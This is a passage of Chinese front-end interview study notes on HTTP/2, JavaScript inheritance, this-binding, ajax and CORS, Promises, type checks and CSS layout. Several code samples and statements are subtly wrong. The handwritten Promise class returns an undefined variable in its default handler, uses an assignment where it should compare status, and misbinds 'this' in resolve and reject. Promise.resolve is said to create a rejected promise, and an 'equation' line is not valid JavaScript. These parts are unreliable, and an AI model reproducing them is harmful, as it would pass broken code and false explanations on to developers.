服务器可以对一个客户端请求发送多个响应，服务器向客户端推送资源无需客户端明确地请求。并且，服务端推送能把客户端所需要的资源伴随着index.html一起发送到客户端，省去了客户端重复请求的步骤。

正因为没有发起请求，建立连接等操作，所以静态资源通过服务端推送的方式可以极大地提升速度。不过与之相比，服务器推送还有一个很大的优势：可以缓存！也让在遵循同源的情况下，不同页面之间可以共享缓存资源成为可能。

当服务端需要主动推送某个资源时，便会发送一个 Frame Type 为 PUSH_PROMISE 的 Frame，里面带了 PUSH 需要新建的 Stream ID。意思是告诉客户端：接下来我要用这个 ID 向你发送东西，客户端准备好接着。客户端解析 Frame 时，发现它是一个 PUSH_PROMISE 类型，便会准备接收服务端要推送的流。

* **多路复用 (Multiplexing)**

在http1.1中，浏览器客户端在同一时间，针对同一域名下的请求有一定数量的限制，超过限制数目的请求会被阻塞。这也是为何一些站点会有多个静态资源 CDN 域名的原因之一。

而http2.0中的多路复用优化了这一性能。多路复用允许同时通过单一的http/2 连接发起多重的请求-响应消息。有了新的分帧机制后，http/2 不再依赖多个TCP连接去实现多流并行了。每个数据流都拆分成很多互不依赖的帧，而这些帧可以交错（乱序发送），还可以分优先级，最后再在另一端把它们重新组合起来。

http 2.0 连接都是持久化的，而且客户端与服务器之间也只需要一个连接（每个域名一个连接）即可。http2连接可以承载数十或数百个流的复用，多路复用意味着来自很多流的数据包能够混合在一起通过同样连接传输。当到达终点时，再根据不同帧首部的流标识符重新连接将不同的数据流进行组装。

* **头部****压缩（****H****eader****C****ompression）**

http1.x的头带有大量信息，而且每次都要重复发送。http/2使用encoder来减少需要传输的header大小，通讯双方各自缓存一份头部字段表，既避免了重复header的传输，又减小了需要传输的大小。

事实上,如果请求中不包含首部(例如对同一资源的轮询请求)，那么，首部开销就是零字节，此时所有首部都自动使用之前请求发送的首部。

如果首部发生了变化，则只需将变化的部分加入到header帧中，改变的部分会加入到头部字段表中，首部表在 http 2.0 的连接存续期内始终存在，由客户端和服务器共同渐进地更新。

http/2使用的是专门为首部压缩而设计的HPACK②算法。（http/2的HPACK算法使用一份索引表来定义常用的http Header，把常用的 http Header 存放在表里，请求的时候便只需要发送在表里的索引位置即可。）

* **请求优先级（Request Priorities）**

把http消息分为很多独立帧之后，就可以通过优化这些帧的交错和传输顺序进一步优化性能。每个流都可以带有一个31比特的优先值：0 表示最高优先级；2的31次方-1 表示最低优先级。

●优先级最高：主要的html

●优先级高：CSS文件

●优先级中：js文件

●优先级低：图片

**性能瓶颈**

启用http2.0后会给性能带来很大的提升，但同时也会带来新的性能瓶颈。因为现在所有的压力集中在底层一个TCP连接之上，TCP很可能就是下一个性能瓶颈，比如TCP分组的队首阻塞问题，单个TCP packet丢失导致整个连接阻塞，无法逃避，此时所有消息都会受到影响。未来，服务器端针对http 2.0下的TCP配置优化至关重要。

## 一.JS

### 1.js 继承

常用六种方法：构造函数继承、原型链继承、组合继承、原型式继承、寄生式继承

* **1构造函数继承**

解决了原型继承中的问题，可以实现多继承.

**缺点：**

实例并不是父类的实例，只是子类的实例。只能继承父类的实例属性和方法，不能继承原型属性/方法。

无法实现函数复用，每个子类都有父类实例函数的副本，影响性能。

```javascript
// 使用 call 或 apply 方法，将父对象的构造函数绑定在子对象上。
function Animal(){
　　this.species = "动物";
}
function Cat(name,color){
　　Animal.apply(this, arguments);
　　this.name = name;
　　this.color = color;
 }
var cat1 = new Cat("大毛","黄色");
alert(cat1.species); // 动物
```
* **2原型链继承**

**缺点：**

来自原型对象的引用类属性是所有实例共享的、

创建子类实例时，无法向父类构造函数传参。

```javascript
Cat.prototype = new Animal(); 
// 将Cat的prototype对象指向一个Animal的实例
Cat.prototype.constructor = Cat; 
// 原本指向Cat的构造函数，受上一句的影响Cat.prototype.constructor指向Animal，而且每一个实例也有一个constructor属性，默认调用prototype对象的constructor属性，这样会导致继承链的絮乱，因此需要手动纠正，将constructor改回为Cat.
var cat1 = new Cat("大毛","黄色");
alert(cat1.species); // 动物
```
**js 原型、原型链概念：原型对象也是普通对象，是对象一个自带的隐式 __proto__ 属性，原型也有可能有自己的原型，如果一个原型对象不为 null 的话，则称之为原型链。原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链。**

* **3组合继承**
```javascript
解决上面的问题，**但调用了两次父类构造函数，生成了两份实例，消耗内存**.
function Parent (name) {
    this.name = name;
    this.colors = ['red', 'blue', 'green'];
}
Parent.prototype.getName = function () {
    console.log(this.name)
}
function Child (name, age) {
    Parent.call(this, name);
    
    this.age = age;
}
Child.prototype = new Parent();
Child.prototype.constructor = Child;
var child1 = new Child('kevin', '18');
```
* **4原型式继承**

就是 ES5 Object.create 的模拟实现，将传入的对象作为创建的对象的原型。

缺点：

包含引用类型的属性值始终都会共享相应的值，这点跟原型链继承一样。

```javascript
function createObj(o) {
    function F(){}
    F.prototype = o;
    return new F();
}
```
* **5寄生式继承**

缺点：跟借用构造函数模式一样，每次创建对象都会创建一遍方法。

```javascript
function createObj (o) {
    var clone = Object.create(o);
    clone.sayName = function () {
        console.log('hi');
    }
    return clone;
}
```
* **6寄生组合式继承**

这种方式的高效率体现它只调用了一次 Parent 构造函数，并且因此避免了在 Parent.prototype 上面创建不必要的、多余的属性。与此同时，原型链还能保持不变；因此，还能够正常使用 instanceof 和 isPrototypeOf。开发人员普遍认为寄生组合式继承是引用类型最理想的继承范式。

```javascript
function Parent (name) {
    this.name = name;
    this.colors = ['red', 'blue', 'green'];
}
Parent.prototype.getName = function () {
    console.log(this.name)
}
function Child (name, age) {
    Parent.call(this, name);
    this.age = age;
}
// 关键的三步
var F = function () {};
F.prototype = Parent.prototype;
Child.prototype = new F();
var child1 = new Child('kevin', '18');
console.log(child1);
// 封装后
function prototype(child, parent) {
    var pt = Object.create(parent.prototype);
    pt.constructor = child;
    child.prototype = pt;
}
// 当我们使用的时候：
prototype(Child, Parent);
```
* **class 类继承**

**与 ES5 继承方式区别**

* ES5继承实质是先创建子类的实例对象，再将父类的方法添加到 this 上 Parent.apply(this)
* ES6继承实质是先创建父类的实例对象，所以必须先调用 super()方法，然后再用子类构造函数修改 this。
```javascript
class Animal {
    constructor(name) {
        this.name = name
    } 
    getName() {
        return this.name
    }
}
class Dog extends Animal {
    constructor(name, age) {
        super(name)
        this.age = age
    }
}
```

### 2.new 操作符具体干了什么，关于 this 的理解及指向问题

this 是在函数被调用时发生的绑定，它指向什么完全取决于函数在哪里被调用。

通常来说，作用域一共有两种主要的工作模型。

* 词法作用域
* 动态作用域

而 JavaScript 就是采用的词法作用域，也就是在编程阶段，作用域就已经明确下来了。

在 JavaScript 中，影响 this 指向的绑定规则有四种：

* 默认绑定
* 隐式绑定
* 显式绑定
* new 绑定

1.默认绑定，这是最直接的一种方式，就是不加任何的修饰符直接调用函数

![图片](https://uploader.shimo.im/f/iSs1Rq4aiFIIEQdw.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

2.隐式绑定，这种情况会发生在调用位置存在「上下文对象」的情况，如：![图片](https://uploader.shimo.im/f/0NwTcwIhNJtSVBuq.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

3.显示绑定

这种就是使用 Function.prototype 中的三个方法 call(), apply(), bind() 了。这三个函数，都可以改变函数的 this 指向到指定的对象，不同之处在于，call() 和 apply() 是立即执行函数，并且接受的参数的形式不同：

**bind 与 call、apply 区别**：bind返回的是一个函数，需要调用才能执行，call、apply 直接执行

* call(this, arg1, arg2, …)
* apply(this, [arg1, arg2, …]) 而 bind() 则是创建一个新的包装函数，并且返回，而不是立刻执行。
* bind(this, arg1, arg2, …) apply() 接收参数的形式，有助于函数嵌套函数的时候，把 arguments 变量传递到下一层函数中。

![图片](https://uploader.shimo.im/f/h8caXwlPbc3xnK4s.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

4.new 绑定

在 JavaScript 中，所有的函数都可以被 new 调用，这时候这个函数一般会被称为「构造函数」，实际上并不存在所谓「构造函数」，更确切的理解应该是对于函数的「构造调用」。

使用 new 来调用函数，会自动执行下面操作：

1. 创建一个全新的对象。
2. 将这个对象的__proto__属性指向constructor函数的prototype属性。。
3. 这个新对象会绑定到函数调用的 this,执行constructor函数。
4. 如果函数没有返回其他对象，那么 new 表达式中的函数调用会自动返回这个新对象。

![图片](https://uploader.shimo.im/f/rfEyovC7NcVvDpTI.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**一个例外情况：**当在构造函数返回一个对象时，内部创建出来的新对象就会被返回的对象所覆盖。

```javascript
function Test(name) {
  this.name = name
  console.log(this) // Test { name: 'yck' }
  return { age: 26 }
}
const t = new Test('yck')
console.log(t) // { age: 26 }
console.log(t.name) // 'undefined'
```
优先级顺序为：

「new 绑定」 > 「显式绑定」 > 「隐式绑定」 > 「默认绑定。」

所以，this 到底是什么

this 并不是在编写的时候绑定的，而是在运行时绑定的。它的上下文取决于函数调用时的各种条件。

this 的绑定和函数声明的位置没有任何关系，只取决于函数的调用方式。

当一个函数被调用时，会创建一个「执行上下文」，这个上下文会包含函数在哪里被调用（调用栈）、函数的调用方式、传入的参数等信息。this 就是这个记录的一个属性，会在函数执行的过程中用到。

### 3.ajax 是怎么创建的，优缺点，如何解决跨域问题，解释下 js 同源策略为什么要有，jsonp 怎么防止接口被滥用及安全性问题。

* **ajax创建过程：**
1. 创建 XMLHttpRequest 对象,也就是创建一个异步调用对象
2. 创建一个新的 HTTP 请求,并指定该 HTTP 请求的方法、URL 及验证信息
3. 设置响应 HTTP 请求状态变化的函数
4. 发送 HTTP 请求
5. 获取异步调用返回的数据
6. 使用 JavaScript和 DOM 实现局部刷新
```javascript
function ajax(options) {
    const { path, method, data } = options;
    return new Promise((resolve, reject) => {
        const request = new XMLHttpRequest();
        request.open(method, path);
        if (method.toLowerCase() === 'post') {
            request.setRequestHeader('Content-Type', "application/x-www-form-urlencoded;charset=UTF-8");
        } 
        request.send(data);
        request.onreadystatechange = () => {
            if (request.readyState === 4) {
                if (request.status >= 200 && request.status < 300) {
                    resolve.call(null, request.responseText);
                } else if (request.status >= 400) {
                    reject.call(null, request)
                }
            }
        }
    })
```

* **XHR enctype 属性规定在发送到服务器之前应该如何对表单数据进行编码**
    * **application/x-www-form-urlencoded**contentType:'application/x-www-form-urlencoded;charset=UTF-8'     data: {username: "John", password: "Boston" }
    * **multipart/form-data**processData:false, //是否自动将 data 转换为字符串。 contentType:false, // 发送信息至服务器时内容编码类型,通过设置 false 跳过设置默认值。 var formData = new FormData(document.querySelector("#data2")); （form id=“#data2”） data: formData
    * **application/json**contentType:'application/json;charset=UTF-8', data: JSON.stringify({username: "John", password: "Boston" })
    * **text/plain**contentType:'text/plain;charset=UTF-8', processData:false, //是否自动将 data 转换为字符串。 data: "我是一个纯正的文本功能!\r\n我第二行"
    * **text/xml**contentType:'text/xml;charset=UTF-8',"<doc><h1>我是标签</h1><p>我是内容</p></doc>"
* ajax 优点
    * 页面局部刷新，用户体验好。
    * 异步通信，更加快的响应能力。
    * 减少冗余请求，减轻了服务器负担；按需获取数据，节约带宽资源。
    * 基于标准化的并被广泛支持的技术，不需要下载插件或者小程序
* 缺点
    * `ajax`干掉了`back`按钮和加入收藏书签功能，即对浏览器后退机制的破坏。
    * 存在一定的安全问题，AJAX 暴露了与服务器交互的细节。
    * 对搜索引擎的支持比较弱。
    * 破坏了程序的异常机制。
    * 无法用`URL`直接访问
* 跨域

1.jsonp 需要目标服务器配合一个callback函数。

2.window.name+iframe 需要目标服务器响应window.name。

3.window.location.hash+iframe 同样需要目标服务器作处理。

4.html5的 postMessage+ifrme 这个也是需要目标服务器或者说是目标页面写一个postMessage，主要侧重于前端通讯。

5.[CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS?fileGuid=6vX3hWyqpyWTRwHj)需要服务器设置header ：Access-Control-Allow-Origin。

6.**nginx**反向代理 这个方法一般很少有人提及，但是他可以不用目标服务器配合，不过需要你搭建一个中转nginx服务器，用于转发请求。

* jsonp

![图片](https://uploader.shimo.im/f/9mUoFcj5UNnLnlvg.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

jsonp的安全性问题：

防御：refer 白名单验证访问来源、部署随机 token 验证

定义成 content-type：application/json，严格过滤 callback的参数，防止 xss 注入

* **js 同源策略：**

同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。

这里的同源策略指的是：**协议，域名，端口相同**，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。

**为什么要有同源限制：**

我们举例说明：比如一个黑客程序，他利用Iframe把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。

**get post 区别**

* get参数通过url传递，post放在request body中。
* get请求在url中传递的参数是有长度限制的，而post没有。
* get比post更不安全，因为参数直接暴露在url中，所以不能用来传递敏感信息。
    * get请求只能进行url编码，而post支持多种编码方式
    * get请求会浏览器主动cache，而post支持多种编码方式。
    * get请求参数会被完整保留在浏览历史记录里，而post中的参数不会被保留。

对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；

而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。

### 4. js块级作用域在ES5/ES6中的不同实现，js 闭包的作用缺陷

从作用域链讲起

首先明确几个概念：

* JavaScript有函数级作用域，但没有块级作用域。（ES6之前）
* 当要使用一个变量时，会沿着作用域链一步一步向上查找。

闭包的特性

闭包的主要特性就是可以从外部访问函数内部的属性和方法。

闭包的用途

利用闭包强大的特性，最方便的用途就是实现私有变量和私有方法；另外，因为使用闭包会在内存中保存函数作用域，因此也能保存变量的值。

闭包导致的问题

* 因为闭包会使得函数中的变量都保存在内存中，如不能及时释放会对性能造成影响。
* 在IE9以下的浏览器会有内存泄漏的问题。

**js setTimeout 闭包问题，连续打印出12345**

![图片](https://uploader.shimo.im/f/XZ2wGKa7dLz3AdmU.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)


### 5.js 垃圾回收机制，什么情况下会发生内存泄漏

与JS中的垃圾回收机制有关，有两种策略来实现垃圾回收：**标记清除**和**引用计数。**

**引用计数：**

**早期的回收算法，**就是**先记下某个变量被引用的总次数，然后当被引用次数为0时，就表示可回收。**问题在于对于根部不可访问即脱离环境的仍存在相互引用的情况，它们的引用次数不为 0，就不能被回收。

**标记清除**

* 垃圾回收器获取根并**“标记”**(记住)它们。
* 然后它访问并“标记”所有来自它们的引用。
* 然后它访问标记的对象并标记它们的引用。所有被访问的对象都被记住，以便以后不再访问同一个对象两次。
* 以此类推，直到有未访问的引用(可以从根访问)为止。
* 除标记的对象外，所有对象都被删除。

一些优化:

* **分代回收**——对象分为两组:“新对象”和“旧对象”。许多对象出现，完成它们的工作并迅速结 ，它们很快就会被清理干净。那些活得足够久的对象，会变“老”，并且很少接受检查。

**新生代垃圾回收**

from和to组成一个`Semispace`（半空间）当我们分配对象时，先在from对象中进行分配，当垃圾回收运行时先检查from中的对象，当`obj2`需要回收时将其留在from空间，而`ob1`分配到to空间，然后进行反转，将from空间和to空间进行互换，进行垃圾 回收时，将to空间的内存进行释放，简而言之from空间存放不被释放的对象，to空间存放被释放的对象，当垃圾回收时将to空间的对象全部进行回收

![图片](https://uploader.shimo.im/f/BiKG7RDOASZzv1Jv.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

新生代对象的晋升（新生代中用来存放，生命较短的对象，老生代存放生命较长的对象）

* 在新生代垃圾回收的过程中，当一个对象经过多次复制后依然存活，它将会被认为是生命周期较长的对象，随后会被移动到老生代中，采取新的算法进行管理
* 在From空间和To空间进行反转的过程中，如果To空间中的使用量已经超过了25%，那么就将From中的对象直接晋升到老生代内存空间中

* **增量回收**——如果有很多对象，并且我们试图一次遍历并标记整个对象集，那么可能会花费一些时间，并在执行中会有一定的延迟。因此，引擎试图将垃圾回收分解为多个部分。然后，各个部分分别执行。这需要额外的标记来跟踪变化，这样有很多微小的延迟，而不是很大的延迟。
* **空闲时间收集**——垃圾回收器只在 CPU 空闲时运行，以减少对执行的可能影响。

什么是垃圾？

一般来说没有被引用的对象就是垃圾，就是要被清除， 有个例外如果几个对象引用形成一个环，互相引用，但根访问不到它们，这几个对象也是垃圾，也要被清除。

### 6.ES6 有哪些新特性，箭头函数和 function 有什么区别

**JS箭头函数和function的区别：**

* 箭头函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。
* 箭头函数不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。
* 箭头函数不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用Rest参数代替。
* 不可以使用yield命令，因此箭头函数不能用作Generator函数。

因为箭头函数没有 this，所以一切试图改变箭头函数this指向都会是无效的，箭头函数的this只取决于定义时的环境。

### 7.Promise 概念，手写 Promise

`Promise`是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6 将其写进了语言标准，统一了用法，原生提供了`Promise`对象。有了`Promise`对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，`Promise`对象提供统一的接口，使得控制异步操作更加容易。

* `Promise`有三种状态`pending`，`resolved`和`rejected`。状态转换只能是`pending`到`resolved`或者`pending`到`rejected`；状态一旦转换完成，不能再次转换。
* `Promise`拥有一个`then`方法，用以处理`resolved`或`rejected`状态下的值。

**实现**

```javascript
class Promise {
  // 定义Promise状态变量，初始值为pending
  status = 'pending';
  // 因为在then方法中需要处理Promise成功或失败时的值，所以需要一个全局变量存储这个值
  data = '';
  // Promise resolve时的回调函数集
  onResolvedCallback = [];
  // Promise reject时的回调函数集
  onRejectedCallback = [];
  // Promise构造函数，传入参数为一个可执行的函数
  constructor(executor) {
    // resolve函数负责把状态转换为resolved
    function resolve(value) {
      this.status = 'resolved';
      this.data = value;
      for (const func of this.onResolvedCallback) {
        func(this.data);
      }
    }
    // reject函数负责把状态转换为rejected
    function reject(reason) {
      this.status = 'rejected';
      this.data = reason;
      for (const func of this.onRejectedCallback) {
        func(this.data);
      }
    }
    // 直接执行executor函数，参数为处理函数resolve, reject。因为executor执行过程有可能会出错，错误情况需要执行reject
    try {
      executor(resolve, reject);
    } catch(e) {
      reject(e)
    }
  }
  /**
    * 拥有一个then方法
    * then方法提供：状态为resolved时的回调函数onResolved，状态为rejected时的回调函数onRejected
    * 返回一个新的Promise
  */
  then(onResolved, onRejected) {
    // 设置then的默认参数，默认参数实现Promise的值的穿透
    onResolved = typeof onResolved === 'function' ? onResolved : function(v) { return e };
    onRejected = typeof onRejected === 'function' ? onRejected : function(e) { throw e };
    let promise2;
    promise2 =  new Promise((resolve, reject) => {
      // 如果状态为resolved，则执行onResolved
      if (this.status === 'resolved') {
        setTimeout(() => {
          try {
            // onResolved/onRejected有返回值则把返回值定义为x
            const x = onResolved(this.data);
            // 执行[[Resolve]](promise2, x)
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (e) {
            reject(e);
          }
        }, 0);
      }
      // 如果状态为rejected，则执行onRejected
      if (this.status === 'rejected') {
        setTimeout(() => {
          try {
            const x = onRejected(this.data);
            this.resolvePromise(promise2, x, resolve, reject);
          } catch (e) {
            reject(e);
          }
        }, 0);
      }
      // 如果状态为pending，则把处理函数进行存储
      if (this.status = 'pending') {
        this.onResolvedCallback.push(() => {
          setTimeout(() => {
            try {
              const x = onResolved(this.data);
              this.resolvePromise(promise2, x, resolve, reject);
            } catch (e) {
              reject(e);
            }
          }, 0);
        });
        this.onRejectedCallback.push(() => {
          setTimeout(() => {
            try {
              const x = onRejected(this.data);
              this.resolvePromise(promise2, x, resolve, reject);
            } catch (e) {
              reject(e);
            }
          }, 0);
        });
      }
    });
    return promise2;
  }
  // [[Resolve]](promise2, x)函数
  resolvePromise(promise2, x, resolve, reject) {
    ...
   //简易版
   // 如果x仍然为Promise的情况
    if (x instanceof Promise) {
      // 如果x的状态还没有确定，那么它是有可能被一个thenable决定最终状态和值，所以需要继续调用resolvePromise
      if (x.status === 'pending') {
        x.then(function(value) {
          resolvePromise(promise2, value, resolve, reject)
        }, reject)
      } else { 
        // 如果x状态已经确定了，直接取它的状态
        x.then(resolve, reject)
      }
      return
    } else {
      resolve(x)
    }
    ... 
  }
  
}
```
**核心极简板20行**
```javascript
function Promise(fn) {
  this.cbs = [];
  const resolve = (value) => {
    setTimeout(() => {
      this.data = value;
      this.cbs.forEach((cb) => cb(value));
    });
  }
  fn(resolve);
}
Promise.prototype.then = function (onResolved) {
  return new Promise((resolve) => {
    this.cbs.push(() => {
      const res = onResolved(this.data);
      if (res instanceof Promise) {
        res.then(resolve);
      } else {
        resolve(res);
      }
    });
  });
};
```
**Promise的一些静态方法**
`Promise.deferred`、`Promise.all`、`Promise.race`、`Promise.resolve`、`Promise.reject`等

* Promise.all方法，`Promise.all`方法接收一个`promise`数组，返回一个新`promise2`，并发执行数组中的全部`promise`，所有`promise`状态都为`resolved`时，`promise2`状态为`resolved`并返回全部`promise`结果，结果顺序和`promise`数组顺序一致。如果有一个`promise`为`rejected`状态，则整个`promise2`进入`rejected`状态。
* Promise.race方法，`Promise.race`方法接收一个`promise`数组, 返回一个新`promise2`，顺序执行数组中的`promise`，有一个`promise`状态确定，`promise2`状态即确定，并且同这个`promise`的状态一致。
* Promise.resolve方法/Promise.reject，`Promise.resolve`用来生成一个`rejected`完成态的`promise`，`Promise.reject`用来生成一个`rejected`失败态的`promise`。
```javascript
// Promise.all
Promise.all = function(promiseArr) {
    let index = 0, result = []
    return new Promise((resolve, reject) => {
        promiseArr.forEach((p, i) => {
            Promise.resolve(p).then(val => {
                index++
                result[i] = val
                if (index === promiseArr.length) {
                    resolve(result)
                }
            }, err => {
                reject(err)
            })
        })
    })
}
```

**Promise存在哪些缺点。**

1、无法取消`Promise`，一旦新建它就会立即执行，无法中途取消。

2、如果不设置回调函数，`Promise`内部抛出的错误，不会反应到外部。

3、吞掉错误或异常，错误只能顺序处理，即便在`Promise`链最后添加`catch`方法，依然可能存在无法捕捉的错误（`catch`内部可能会出现错误）

4、阅读代码不是一眼可以看懂，你只会看到一堆`then`，必须自己在`then`的回调函数里面理清逻辑。

因为Promise.all是同时运行多个promsie对象,对于同时并发数有限制的情况，可以采用顺序处理的方式

**使用Promise进行顺序（sequence）处理。**

1、使用`async`函数配合`await`或者使用`generator`函数配合`yield`。

2、使用`promise.then`通过`for`循环或者`Array.prototype.reduce`实现。

```javascript
function sequenceTasks(tasks) {
    function recordValue(results, value) {
        results.push(value);
        return results;
    }
    var pushValue = recordValue.bind(null, []);
    return tasks.reduce(function (promise, task) {
        return promise.then(() => task).then(pushValue);
    }, Promise.resolve());
}
```
**Promise链上返回的最后一个Promise出错了怎么办？**
`catch`在`promise`链式调用的末尾调用，用于捕获链条中的错误信息，但是`catch`方法内部也可能出现错误，所以有些`promise`实现中增加了一个方法`done`，`done`相当于提供了一个不会出错的`catch`方法，并且不再返回一个`promise`，一般用来结束一个`promise`链。

### 
### 8.js 事件流模型 ，事件委托

**事件代理**：就是利用**事件冒泡的原理**，只指定一个事件处理程序来管理某一类型的所有事件。目的：减少DOM操作，提高性能。原理：事件冒泡中，事件是从最深的节点开始，然后逐步向上传播事件，那么我们给最外面的节点添加事件，那么子节点被触发时(如：cilck)都会冒泡到最外层的节点上，所以都会触发。

**事件流****模型**：**捕获型事件和冒泡型事件。**调用事件处理阶段-》捕获-》目标-》冒泡

**捕获性事件应用场景**：适用于作全局范围内的监听，这里的全局是相对的全局，相对于某个顶层结点与该结点所有子孙结点形成的集合范围。![图片](https://uploader.shimo.im/f/MNUonLM8J6uSbvbX.png!thumbnail?fileGuid=6vX3hWyqpyWTRwHj)

**当事件捕获和事件冒泡一起存在的情况，事件又是如何触发呢**

* 对于非target节点则先执行捕获在执行冒泡
* 对于target节点则是先执行先注册的事件，无论冒泡还是捕获

### 9.requestAnimationFrame、setTimeout、setInterval

requestAnimationFrame 方法让我们可以在下一帧开始时调用指定函数。

以往JS控制的动画大多使用 setInterval 或者 setTimeout 每隔一段时间刷新元素的位置，来达到动画的效果，但是这种方式并不能准确地控制动画帧率，尽管主流的浏览器对于这两个函数实现的动画都有一定的优化，但是这依然无法弥补它们性能问题。主要原因是因为JavaScript的单线程机制使得其可能在有阻塞的情况下无法精确到毫秒触发。

requestAnimationFrame()方法正是为了满足高性能动画的需求而提供的API，通过setInterval方法控制的动画其调用的间隔由程序员设置，而requestAnimationFrame()无须设置调用间隔， 它自动紧跟浏览器的绘制的帧率（一般浏览器的显示帧率是60fps，差不多每帧间隔16.7ms）

在实际开发中， 当然尽量使用css动画， 毕竟css动画性能更优。但是对于一些复杂的动画，比如有暂停，继续等复杂交互等动画还是需要requestAnimationFrame

requestAnimationFrame 不管理回调函数队列，而滚动、触摸这类高触发频率事件的回调可能会在同一帧内触发多次。所以正确使用 requestAnimationFrame 的姿势是，在同一帧内可能调用多次 requestAnimationFrame时，要管理回调函数，防止重复绘制动画。

### 10 JS 数据类型和判断

基本数据类型：number, string, boolean, undefined, BigInt, Symbol, null

引用数据类型：Object

对象类型： Array, Function, Map, Set, WeakMap, WeakSet

特殊对象： RegExp, Date

BigInt 类型可以用任意精度表示整数，可以安全地存储和操作大整数

Symbol 符号，符号类型是唯一的并且是不可修改的，可以用来作为 Object 的 key 值。



判断：

**typeof**

typeof返回一个表示数据类型的字符串，返回结果包括：number、string、boolean、object、undefined、function。typeof可以对基本类型number、string  、boolean、undefined做出准确的判断（null除外，typeof null===“object”)而对于引用类型，除了function之外返回的都是object。但当我们需要知道某个对象的具体类型时，typeof就显得有些力不从心了。

**instanceof**

当我们需要知道某个对象的具体类型时,可以用运算符 instanceof，instanceof操作符判断左操作数对象的原型链上是否有右边这个构造函数的prototype属性，也就是说指定对象是否是某个构造函数的实例，最后返回布尔值。 检测的我们用一段伪代码来模拟instanceof内部执行过程.

```javascript
function instanceOf(left, right) {
    let proto = left.__proto__
    while (true) {
        if (proto === null) return false
        if (proto === right.prototype) {
            return true
        }
        proto = proto.__proto__
    }
}
```
**constructor**
constructor属性的作用是，可以得知某个实例对象，到底是哪一个构造函数产生的。但是 constructor 属性易变，不可信赖，这个主要体现在自定义对象上，当开发者重写prototype后，原有的constructor会丢失。

**Object.prototype.toString**

toString是Object原型对象上的一个方法，该方法默认返回其调用者的具体类型，更严格的讲，是 toString运行时this指向的对象类型, 返回的类型格式为[object,xxx],xxx是具体的数据类型，其中包括：String,Number,Boolean,Undefined,Null,Function,Date,Array,RegExp,Error,HTMLDocument,... 基本上所有对象的类型都可以通过这个方法获取到。

**类型转换**

* 强制转换

**转布尔值规则：**undefined、null、false、NaN、''、0、-0都会转换为 false；

其他所有制都转为 true，包括所有对象。

**转数字规则：**true 为1，false、null为0，undefined 为 NaN, symbol 报错，

字符串如果是数字或者进制值就转为数字，否则就 NaN

* **隐式转换**

四则运算中：

只有当加法运算中，其中一方是字符串类型，就会把另一个也转换为字符串类型

其他运算中，只要其中一方是数字，那么另一方就转化为数字。

**常见**

```javascript
[] == ![]; // true
5 + '1' = '51'
5 - '1' = 4
```
## 二.CSS

### 1.CSS 选择符有哪些，那些属性可以继承，优先级。CSS3 新增伪类。

**可继承的样式：**

1.font-size  2.font-family

3.color   4.text-indent

**不可继承的样式：**

1.border   2.padding

3.margin   4.width   5.height

优先级算法：

1.优先级就近原则，同权重情况下样式定义最近者为准;

2.载入样式以最后载入的定位为准;

3.!important >  id > class > tag

4.important 比 内联优先级高，但内联比 id 要高

**CSS3新增伪类举例：**

p:first-of-type 选择属于其父元素的首个 <p> 元素的每个 <p> 元素。

p:last-of-type  选择属于其父元素的最后 <p> 元素的每个 <p> 元素。

p:only-of-type  选择属于其父元素唯一的 <p> 元素的每个 <p> 元素。

p:only-child    选择属于其父元素的唯一子元素的每个 <p> 元素。

p:nth-child(2)  选择属于其父元素的第二个子元素的每个 <p> 元素。

:enabled :disabled 控制表单控件的禁用状态。

:checked        单选框或复选框被选中

### 2.CSS3 那些新特性

1. CSS3实现圆角（border-radius），阴影（box-shadow），

2. 对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）

3. transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜

4. 增加了更多的CSS选择器  多背景 rgba

5. 在CSS3中唯一引入的伪元素是 ::selection.

6. 媒体查询，多栏布局

7. border-image

### 3.对 BFC/IFC 规范的理解，清除浮动的几种方法

**BFC，块级格式化上下文**，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个 BFC 中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的 margin 会发生折叠。

它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用。当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。也可以说BFC就是一个作用范围。

**IFC（Inline Formatting Context）即行内格式化上下文**

**如何产生BFC**

当一个HTML元素满足下面条件的任何一点，都可以产生Block Formatting Context：

**a、float的值不为none**

**b、overflow的值不为visible**

**c、display的值为table-cell, table-caption, inline-block中的任何一个**

**d、position的值不为relative和static**

CSS3触发BFC方式则可以简单描述为：在元素定位非static，relative的情况下触发，float也是一种定位方式。

(3)、BFC的作用与特点

a、不和浮动元素重叠，清除外部浮动，阻止浮动元素覆盖

如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个重叠的现象。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态，当float不为none时，position为absolute、fixed时元素将脱离标准流。

